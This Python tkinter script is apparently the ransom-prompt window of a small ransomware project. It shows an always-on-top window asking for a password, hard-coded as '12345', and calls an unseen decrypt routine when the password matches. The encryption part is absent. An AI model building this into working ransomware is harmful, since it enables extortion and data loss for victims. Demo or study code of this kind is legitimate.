import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showinfo
#-----------------------------------------------------------------
from decrypt import decrypt


def start_window():

    global root
    root = tk.Tk()

    root.title('ransomware')
    root.geometry('500x300+50+50')
    root.resizable(False, False)
    root.attributes('-topmost', 1) #window always on top

    ttk.Label(root, text='Enter password to decrypt your files', font=('Arial', 18)).pack(ipady= 25)

    global password
    password = tk.StringVar()
    ttk.Entry(root, textvariable=password, show='*').pack(fill='x', padx=40)

    ttk.Button(root, text='Submit',command=verify_password).pack(fill='x', padx= 100, pady=30)

    root.mainloop()


def verify_password():
    # print(password.get()) # GET works with tk.stringvar :)
    if password.get()=='12345':
        showinfo(title='correct password', message='The password is correct.\n Your files will be decrypted')
        decrypt()
    else:
        showinfo(title='incorrect password', message='The password is incorrect.\n Please try again')


